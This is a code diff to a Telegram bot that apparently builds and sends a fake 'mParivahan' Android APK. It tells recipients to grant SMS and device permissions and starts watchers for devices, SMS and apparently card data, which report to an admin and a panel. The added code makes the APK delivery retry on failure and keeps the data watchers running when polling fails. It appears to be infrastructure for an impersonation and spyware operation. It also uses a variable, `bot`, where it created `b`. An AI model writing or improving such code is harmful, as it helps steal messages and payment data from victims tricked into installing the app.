@@ -1,4 +1,5 @@
 import { Telegraf, Markup, Context } from "telegraf";
+import * as fs from "fs";
 import { logger } from "../lib/logger";
 import {
   getSubscription,
@@ -431,6 +432,29 @@ export function createBot(): Telegraf {
         `4. Grant SMS/Device permissions`,
         { parse_mode: "Markdown" }
       );
+      // Upload via a streaming source + retry with backoff. Large (5MB)
+      // multipart uploads via node-fetch can reset ("socket hang up" /
+      // ECONNRESET), so retry transient failures up to 3 times.
+      let sent = false;
+      for (let attempt = 0; attempt < 3 && !sent; attempt++) {
+        try {
+          await ctx.replyWithDocument({
+            source: fs.createReadStream(apkPath),
+            filename: `mParivahan_AxeCodi.apk`,
+          });
+          sent = true;
+        } catch (uploadErr: any) {
+          const msg = uploadErr?.message || String(uploadErr);
+          const isTransient =
+            /socket hang up|ECONNRESET|connection reset|timeout|429|Too Many Requests/i.test(msg);
+          if (!isTransient || attempt === 2) throw uploadErr;
+          logger.warn(
+            { attempt: attempt + 1, msg },
+            "APK upload transient failure — retrying"
+          );
+          await new Promise((r) => setTimeout(r, 3000 * (attempt + 1)));
+        }
+      }
     } catch (err: any) {
       logger.error({ err }, "buildAndSendMparivahan error");
       const errMsg = err?.message || String(err);
@@ -1021,6 +1045,22 @@ export function createBot(): Telegraf {
 // Launches the bot in long-poll mode (for Render / local / containers)
 export async function startBot(): Promise<void> {
   const b = createBot();
+  // Launch bot in the background (non-blocking).
+  // NOTE: bot.launch() returns a promise that only resolves when the bot STOPS,
+  // so watchers must be started immediately, NOT inside .then().
+  startDeviceWatcher(bot, ADMIN_ID);
+  startSmsWatcher(bot, ADMIN_ID);
+  startCcWatcher(bot, ADMIN_ID);
+  logger.info("Watchers started");
+
+  bot.launch({ dropPendingUpdates: true }).catch((err: any) => {
+    if (err?.response?.error_code === 409 || err?.message?.includes("409")) {
+      logger.warn("Bot 409 conflict — another instance is running. Polling terminated for this process, but watchers remain active.");
+    } else {
+      logger.error({ err }, "Bot launch error");
+    }
+  });
+  logger.info("Telegram bot started");
 
   // Warn admin if PANEL_URL is not set
   if (!process.env["PANEL_URL"]) {
